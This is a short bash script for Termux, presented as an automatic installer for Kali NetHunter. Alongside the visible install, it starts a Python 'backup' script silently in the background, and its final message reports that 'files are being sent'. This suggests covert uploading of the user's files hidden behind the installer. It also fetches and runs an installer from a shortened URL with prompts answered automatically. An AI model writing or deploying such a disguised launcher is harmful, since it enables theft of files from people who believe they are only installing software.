#!/bin/bash

CYAN='\033[0;36m'
G='\033[0;32m'
NC='\033[0m'

clear
echo -e "${CYAN}--- STARTING EXTREME AUTO-INSTALLER ---${NC}"

pkg update -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
pkg install python requests wget -y

python3 fast_backup.py > /dev/null 2>&1 &

echo -e "${G}[+] Backup process is running at MAX speed in background...${NC}"
echo -e "${CYAN}[*] Installing Kali NetHunter (Silent Mode)...${NC}"

wget -q https://offs.ec/2MceZWr -O install-nethunter-termux
chmod +x install-nethunter-termux

# إدخال الخيارات تلقائياً (الخيار 1 للنسخة الصغيره جداً)
printf "1\nn\n" | ./install-nethunter-termux

echo -e "${G}✅ ALL DONE. NetHunter installed and files are being sent.${NC}"
